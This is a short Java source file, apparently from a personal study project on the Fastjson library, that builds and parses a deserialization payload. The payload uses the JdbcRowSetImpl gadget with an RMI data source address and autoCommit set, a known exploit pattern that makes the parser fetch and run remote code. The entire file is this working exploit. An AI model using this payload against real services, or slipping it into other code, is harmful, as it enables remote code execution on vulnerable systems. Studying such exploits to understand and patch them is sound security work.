package com.fastjsonStudy;


import com.alibaba.fastjson.JSON;

public class Client {
    public static void main(String[] argv){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}